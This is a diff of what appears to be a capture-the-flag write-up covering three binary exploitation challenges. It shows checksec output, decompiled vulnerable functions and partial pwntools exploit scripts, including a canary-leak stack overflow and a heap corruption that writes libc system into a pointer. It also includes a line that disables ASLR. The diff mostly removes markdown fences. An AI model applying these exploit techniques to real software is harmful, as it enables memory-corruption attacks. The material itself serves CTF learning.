@@ -5,34 +5,24 @@
 
 
 ```
-unlimited_subway: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a91c8ae32dffbdc3a706e70158ae362900e2b4de, for GNU/Linux 3.2.0, with debug_info, not stripped 
+unlimited_subway: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a91c8ae32dffbdc3a706e70158ae362900e2b4de, for GNU/Linux 3.2.0, with debug_info, not stripped
 
 Canary : ✓
 NX : ✓
 PIE : ✘
 Fortify : ✘
 RelRO : Partial
-```
-
-
-
-```
 int __cdecl view_account(int a1, int a2)
 {
  return printf("Index %d : %02x\n", a2, *(unsigned __int8 *)(a2 + a1));
 }
-```
-
-
-
-```
 from pwn import *
 
 r = process("./share/unlimited_subway")
 
 #!/usr/bin/env python2
 '''
- author : tripoloski 
+ author : tripoloski
  visit : https://tripoloski1337.github.io/
  mail : arsalan.dp@gmail.com
 '''
@@ -82,7 +72,7 @@ def exploit(r):
  p += b"AAAA" * 5
  p += p32(canary_leak)
  p += p32(0x0804900e)
- p += p32(0x8049304) 
+ p += p32(0x8049304)
 
  done(2000, p)
  r.interactive()
@@ -96,11 +86,6 @@ if __name__ == "__main__":
  r = process([TARGET,])
  exploit(r)
  sys.exit(0)
-```
-
-
-
-```
 super_secure_heap: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7ab5b212ea5cca28863c19afbc5887a6da6ceec3, for GNU/Linux 3.2.0, not stripped
 
 Canary : ✓
@@ -108,11 +93,6 @@ NX : ✓
 PIE : ✓
 Fortify : ✘
 RelRO : Full
-```
-
-
-
-```
 __int64 __usercall set@<rax>(__int64 a1@<rbp>, __int64 a2@<rdi>, __int64 a3@<rsi>)
 {
  __int64 result; // rax
@@ -171,11 +151,6 @@ __int64 __usercall set@<rax>(__int64 a1@<rbp>, __int64 a2@<rdi>, __int64 a3@<rsi
  }
  return result;
 }
-```
-
-
-
-```
 __int64 __usercall delete@<rax>(__int64 a1@<rbp>, __int64 a2@<rdi>, int a3@<esi>)
 {
  __int64 result; // rax
@@ -199,18 +174,13 @@ __int64 __usercall delete@<rax>(__int64 a1@<rbp>, __int64 a2@<rdi>, int a3@<esi>
  }
  return result;
 }
-```
-
-
-
-```
 from pwn import *
 
 # r = process("./super_secure_heap")
 
 #!/usr/bin/env python2
 '''
- author : tripoloski 
+ author : tripoloski
  visit : https://tripoloski1337.github.io/
  mail : arsalan.dp@gmail.com
 '''
@@ -279,7 +249,7 @@ def exploit(r):
  attach(r)
  keys_add(3000)
  keys_add(3000)
- 
+
  keys_delete(0)
  keys_delete(1)
  keys_add(33)
@@ -307,7 +277,7 @@ def exploit(r):
  content_delete(1)
  content_delete(2)
  content_delete(3)
- 
+
  keys_add(20)
  keys_add(20)
  keys_add(20)
@@ -336,9 +306,9 @@ def exploit(r):
  keys_modify(8, "19", p64(libc_system))
 
  content_delete(3)
- 
- 
- 
+
+
+
 
  r.interactive()
 
@@ -351,11 +321,6 @@ if __name__ == "__main__":
  r = process([TARGET,])
  exploit(r)
  sys.exit(0)
-```
-
-
-
-```
 double_zer0_dilemma: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0f73d6da7c5ff209f9b2a6b51a52f86448c97ec, for GNU/Linux 3.2.0, not stripped
 
 Canary : ✘
@@ -363,17 +328,7 @@ NX : ✓
 PIE : ✘
 Fortify : ✘
 RelRO : Partial
-```
-
-
-
-```
 RUN sysctl kernel.randomize_va_space=0
-```
-
-
-
-```
 sub_4010A0("Enter the number (0-36) you think the roulette will land on: ");
 sub_4010F0("%d", &idx);
 sub_4010A0("Enter the amount you want to wager: ");
@@ -389,18 +344,13 @@ else
  bets[idx] /= 2LL;
  result = sub_4010A0("Better luck next time! You lost.");
 }
-```
-
-
-
-```
 from pwn import *
 
 # r = process("./super_secure_heap")
 
 #!/usr/bin/env python2
 '''
- author : tripoloski 
+ author : tripoloski
  visit : https://tripoloski1337.github.io/
  mail : arsalan.dp@gmail.com
 '''
